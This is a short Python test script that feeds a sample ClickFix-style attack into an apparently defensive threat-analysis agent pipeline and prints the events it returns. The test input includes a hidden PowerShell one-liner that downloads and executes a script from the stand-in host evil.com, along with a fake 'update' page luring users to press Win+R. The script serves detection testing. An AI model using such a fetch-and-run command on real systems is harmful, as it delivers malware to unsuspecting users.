import asyncio
import json
import os
from agent.agent import app

async def main():
    payload = {
        "victim_url": "http://localhost:8000/test_clickfix.html",
        "culprit_js_url": "",
        "clipboard_payload": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass iex(new-object net.webclient).downloadstring('http://evil.com/payload.ps1')",
        "raw_dom": "<html><head></head><body><h1>Fake Update</h1><div class='lure'>Press Win+R</div><script>var _0xabc=['123'];</script></body></html>"
    }
    
    print("Running threat pipeline via AdkApp.stream_query...")
    try:
        events = app.stream_query(
            message=json.dumps(payload),
            user_id="test_user"
        )
        print("\n--- Pipeline Events ---")
        for event in events:
            print(json.dumps(event, indent=2))
    except Exception as e:
        print("Error during pipeline execution:", e)

if __name__ == "__main__":
    asyncio.run(main())

